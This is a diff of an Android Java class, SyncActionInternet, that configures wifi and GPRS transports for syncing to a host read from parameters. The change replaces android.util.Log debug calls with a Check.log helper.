@@ -11,11 +11,10 @@ package com.android.service.action;
 
 import java.io.IOException;
 
-import android.util.Log;
-
 import com.android.service.action.sync.GprsTransport;
 import com.android.service.action.sync.WifiTransport;
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
@@ -72,7 +71,7 @@ public class SyncActionInternet extends SyncAction {
 			host = WChar.getString(buffer, true);
 
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
+			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
 			return false;
 		}
 		final StringBuffer sb = new StringBuffer();
@@ -80,7 +79,7 @@ public class SyncActionInternet extends SyncAction {
 		sb.append(" wifi: " + wifi);
 		sb.append(" wifiForced: " + wifiForced);
 		sb.append(" host: " + host);
-		if(Cfg.DEBUG) Log.d("QZ", TAG + sb.toString());
+		if(Cfg.DEBUG) Check.log( TAG + sb.toString());
 		return true;
 	}
 
@@ -92,12 +91,12 @@ public class SyncActionInternet extends SyncAction {
 	@Override
 	protected boolean initTransport() {
 		if (wifi) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " initTransport adding WifiTransport");
+			if(Cfg.DEBUG) Check.log( TAG + " initTransport adding WifiTransport");
 			transports.addElement(new WifiTransport(host, wifiForced));
 		}
 
 		if (gprs) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " initTransport adding DirectTransport");
+			if(Cfg.DEBUG) Check.log( TAG + " initTransport adding DirectTransport");
 			transports.addElement(new GprsTransport(host));
 		}
 
